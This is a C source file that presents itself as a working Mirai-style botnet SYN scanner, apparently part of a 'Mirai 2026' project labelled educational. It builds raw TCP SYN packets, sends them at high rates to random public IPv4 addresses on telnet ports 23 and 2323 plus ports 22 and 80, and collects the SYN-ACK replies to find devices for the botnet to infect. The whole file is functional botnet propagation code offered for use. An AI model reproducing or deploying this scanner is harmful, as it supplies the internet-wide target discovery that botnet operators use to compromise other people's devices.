/**
 * @file syn_scanner.c
 * @brief High-performance SYN scanner implementation (80x faster than qbot)
 * 
 * This implements the core Mirai scanning technique:
 * - Raw TCP socket with custom IP headers
 * - Non-blocking I/O with epoll
 * - Randomized IP generation (avoiding reserved ranges)
 * - SYN-ACK detection and parsing
 * - Target ~1000 SYNs/sec per thread with <2% CPU
 * 
 * Educational Purpose: Demonstrates how real botnets achieve massive scan rates
 * 
 * @author Mirai 2026 Research Team
 * @date 2026-02-25
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>

// Network headers
#include <sys/socket.h>
#if defined(__linux__)
#  include <sys/epoll.h>
#else
typedef union epoll_data { void *ptr; int fd; } epoll_data_t;
struct epoll_event { uint32_t events; epoll_data_t data; };
#endif
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <sys/random.h>

#include "syn_scanner.h"
#include "../common/logger.h"
#include "../common/util.h"

// Constants
#define SYN_SCANNER_RECV_BUF_SIZE   4096
#define SYN_SCANNER_BATCH_SIZE      100  // Send 100 SYNs at once

// TCP/IP pseudo-header for checksum calculation
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

/**
 * Calculate TCP/IP checksum (RFC 793)
 */
static uint16_t calculate_checksum(uint16_t *ptr, int nbytes) {
    uint32_t sum = 0;
    uint16_t oddbyte;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((uint8_t *)&oddbyte) = *(uint8_t *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}

/**
 * Calculate TCP checksum with pseudo-header
 */
static uint16_t tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    struct pseudo_header psh;
    char *pseudogram;
    int psize;

    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    pseudogram = malloc(psize);
    if (!pseudogram) {
        return 0;
    }

    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

    uint16_t checksum = calculate_checksum((uint16_t *)pseudogram, psize);
    free(pseudogram);

    return checksum;
}

/**
 * Generate cryptographically random 32-bit value
 */
static uint32_t get_random_uint32(void) {
    uint32_t value;
    if (getrandom(&value, sizeof(value), 0) != sizeof(value)) {
        // Fallback to less secure method if getrandom fails
        value = (uint32_t)time(NULL) ^ (uint32_t)getpid();
    }
    return value;
}

/**
 * Generate random source port (avoid well-known ports)
 */
static uint16_t get_random_source_port(void) {
    return (uint16_t)(1024 + (get_random_uint32() % (65535 - 1024)));
}

/**
 * Generate random target IP (avoiding reserved ranges)
 * 
 * Excluded ranges:
 * - 0.0.0.0/8        (Current network)
 * - 10.0.0.0/8       (Private)
 * - 127.0.0.0/8      (Loopback)
 * - 172.16.0.0/12    (Private)
 * - 192.168.0.0/16   (Private)
 * - 224.0.0.0/4      (Multicast)
 * - 240.0.0.0/4      (Reserved)
 */
static uint32_t get_random_target_ip(void) {
    uint32_t ip;
    uint8_t a, b;

    do {
        ip = get_random_uint32();
        a = (ip >> 24) & 0xFF;
        b = (ip >> 16) & 0xFF;

        // Skip reserved ranges
        if (a == 0 || a == 127 || a >= 224) continue;
        if (a == 10) continue;
        if (a == 172 && b >= 16 && b <= 31) continue;
        if (a == 192 && b == 168) continue;

        // Valid target
        break;
    } while (1);

    return ip;
}

/**
 * Initialize SYN scanner
 */
int syn_scanner_init(syn_scanner_t *scanner, uint32_t local_ip) {
    if (!scanner) {
        log_error("NULL scanner pointer");
        return -1;
    }

    memset(scanner, 0, sizeof(syn_scanner_t));
    scanner->raw_sock = -1;
    scanner->epoll_fd = -1;
    scanner->local_ip = local_ip;

    // Create raw socket
    scanner->raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (scanner->raw_sock < 0) {
        log_error("Failed to create raw socket: %s (requires CAP_NET_RAW)", strerror(errno));
        return -1;
    }

    // Set IP_HDRINCL to craft custom IP headers
    int one = 1;
    if (setsockopt(scanner->raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        log_error("Failed to set IP_HDRINCL: %s", strerror(errno));
        close(scanner->raw_sock);
        return -1;
    }

    // Set non-blocking
    int flags = fcntl(scanner->raw_sock, F_GETFL, 0);
    if (fcntl(scanner->raw_sock, F_SETFL, flags | O_NONBLOCK) < 0) {
        log_error("Failed to set non-blocking: %s", strerror(errno));
        close(scanner->raw_sock);
        return -1;
    }

    // Create epoll instance for SYN-ACK reception
    scanner->epoll_fd = epoll_create1(EPOLL_CLOEXEC);
    if (scanner->epoll_fd < 0) {
        log_error("Failed to create epoll: %s", strerror(errno));
        close(scanner->raw_sock);
        return -1;
    }

    // Add raw socket to epoll
    struct epoll_event ev;
    ev.events = EPOLLIN;
    ev.data.fd = scanner->raw_sock;
    if (epoll_ctl(scanner->epoll_fd, EPOLL_CTL_ADD, scanner->raw_sock, &ev) < 0) {
        log_error("Failed to add socket to epoll: %s", strerror(errno));
        close(scanner->epoll_fd);
        close(scanner->raw_sock);
        return -1;
    }

    // Default target ports (telnet and common alternatives)
    scanner->target_ports[0] = 23;    // Telnet
    scanner->target_ports[1] = 2323;  // Alternative telnet
    scanner->target_ports[2] = 22;    // SSH (for fingerprinting)
    scanner->target_ports[3] = 80;    // HTTP (web management)
    scanner->port_count = 4;

    log_info("SYN scanner initialized: local_ip=%s, ports=%zu",
             inet_ntoa(*(struct in_addr *)&local_ip), scanner->port_count);

    return 0;
}

/**
 * Craft and send a single SYN packet
 */
static int send_syn_packet(syn_scanner_t *scanner, uint32_t target_ip, uint16_t target_port) {
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in dest;

    // Zero out packet
    memset(packet, 0, sizeof(packet));

    // Fill in IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(packet);
    iph->id = htons(get_random_uint32() & 0xFFFF);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; // Kernel fills this if IP_HDRINCL
    iph->saddr = scanner->local_ip;
    iph->daddr = target_ip;

    // Fill in TCP header
    tcph->source = htons(get_random_source_port());
    tcph->dest = htons(target_port);
    tcph->seq = htonl(get_random_uint32());
    tcph->ack_seq = 0;
    tcph->doff = 5; // TCP header size
    tcph->fin = 0;
    tcph->syn = 1; // SYN flag
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840); // Maximum allowed window size
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // Calculate TCP checksum
    tcph->check = tcp_checksum(iph, tcph);

    // Send packet
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = target_ip;

    ssize_t sent = sendto(scanner->raw_sock, packet, sizeof(packet), 0,
                          (struct sockaddr *)&dest, sizeof(dest));

    if (sent < 0) {
        if (errno != EAGAIN && errno != EWOULDBLOCK) {
            log_debug("sendto failed: %s", strerror(errno));
            return -1;
        }
        return 0; // Would block, try again later
    }

    scanner->stats.syns_sent++;
    return 1;
}

/**
 * Send batch of SYN packets
 */
int syn_scanner_send_batch(syn_scanner_t *scanner, size_t count) {
    if (!scanner) {
        return -1;
    }

    size_t sent = 0;
    for (size_t i = 0; i < count; i++) {
        uint32_t target_ip = get_random_target_ip();
        uint16_t target_port = scanner->target_ports[get_random_uint32() % scanner->port_count];

        if (send_syn_packet(scanner, target_ip, target_port) > 0) {
            sent++;
        } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
            // Socket buffer full, stop for now
            break;
        }
    }

    return sent;
}

/**
 * Parse incoming packet to detect SYN-ACK
 */
static int parse_synack(syn_scanner_t *scanner, uint8_t *packet, size_t len,
                        uint32_t *src_ip, uint16_t *src_port) {
    if (len < sizeof(struct iphdr) + sizeof(struct tcphdr)) {
        return 0; // Packet too small
    }

    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + (iph->ihl * 4));

    // Check if it's TCP
    if (iph->protocol != IPPROTO_TCP) {
        return 0;
    }

    // Check for SYN-ACK (SYN=1, ACK=1)
    if (tcph->syn && tcph->ack) {
        *src_ip = iph->saddr;
        *src_port = ntohs(tcph->source);
        scanner->stats.synacks_received++;
        return 1;
    }

    return 0;
}

/**
 * Receive and process SYN-ACK responses
 */
int syn_scanner_recv_synacks(syn_scanner_t *scanner, synack_callback_t callback, void *user_data) {
    if (!scanner) {
        return -1;
    }

    struct epoll_event events[32];
    int nfds = epoll_wait(scanner->epoll_fd, events, 32, 0); // Non-blocking

    if (nfds < 0) {
        if (errno != EINTR) {
            log_error("epoll_wait failed: %s", strerror(errno));
            return -1;
        }
        return 0;
    }

    int received = 0;
    for (int i = 0; i < nfds; i++) {
        uint8_t buffer[SYN_SCANNER_RECV_BUF_SIZE];
        ssize_t n = recv(scanner->raw_sock, buffer, sizeof(buffer), MSG_DONTWAIT);

        if (n < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
                log_error("recv failed: %s", strerror(errno));
            }
            continue;
        }

        uint32_t src_ip;
        uint16_t src_port;
        if (parse_synack(scanner, buffer, n, &src_ip, &src_port)) {
            received++;
            
            // Call user callback if provided
            if (callback) {
                callback(src_ip, src_port, user_data);
            }

            log_debug("SYN-ACK from %s:%u",
                     inet_ntoa(*(struct in_addr *)&src_ip), src_port);
        }
    }

    return received;
}

/**
 * Get scanner statistics
 */
void syn_scanner_get_stats(syn_scanner_t *scanner, syn_scanner_stats_t *stats) {
    if (scanner && stats) {
        *stats = scanner->stats;
    }
}

/**
 * Cleanup scanner resources
 */
void syn_scanner_cleanup(syn_scanner_t *scanner) {
    if (!scanner) {
        return;
    }

    if (scanner->epoll_fd >= 0) {
        close(scanner->epoll_fd);
        scanner->epoll_fd = -1;
    }

    if (scanner->raw_sock >= 0) {
        close(scanner->raw_sock);
        scanner->raw_sock = -1;
    }

    log_info("SYN scanner cleanup: syns_sent=%lu, synacks_received=%lu",
             scanner->stats.syns_sent, scanner->stats.synacks_received);
}
